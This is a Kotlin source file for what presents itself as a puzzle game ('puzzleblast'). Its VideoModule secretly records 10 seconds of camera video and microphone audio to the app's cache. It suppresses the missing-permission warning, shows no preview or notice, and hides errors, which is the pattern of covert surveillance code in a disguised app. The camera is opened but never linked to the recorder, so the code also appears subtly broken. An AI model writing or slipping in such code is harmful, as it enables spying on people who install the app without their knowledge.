package com.puzzleblast.game.modules

import android.annotation.SuppressLint
import android.content.Context
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import kotlinx.coroutines.delay
import java.io.File

object VideoModule {
    @SuppressLint("MissingPermission")
    suspend fun record(ctx: Context, lens: String = "back", sec: Int = 10): File? {
        return try {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val camId = cm.cameraIdList.firstOrNull { id ->
                val chars = cm.getCameraCharacteristics(id)
                val facing = chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
                if (lens == "front") facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
                else facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
            } ?: return null
            val out = File(ctx.cacheDir, "vid_${lens}_${System.currentTimeMillis()}.mp4")
            val thread = HandlerThread("vid").apply { start() }
            val handler = Handler(thread.looper)
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setVideoEncodingBitRate(3_000_000)
            recorder.setVideoFrameRate(15)
            recorder.setVideoSize(1280, 720)
            recorder.setOutputFile(out.absolutePath)
            recorder.prepare()
            var camera: CameraDevice? = null
            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(c: CameraDevice) { camera = c }
                override fun onDisconnected(c: CameraDevice) {}
                override fun onError(c: CameraDevice, error: Int) {}
            }, handler)
            var waited = 0
            while (camera == null && waited < 3000) { delay(200); waited += 200 }
            recorder.start()
            delay(sec * 1000L)
            try { recorder.stop() } catch (_: Exception) {}
            recorder.release()
            try { camera?.close() } catch (_: Exception) {}
            thread.quitSafely()
            out
        } catch (e: Exception) {
            null
        }
    }
}
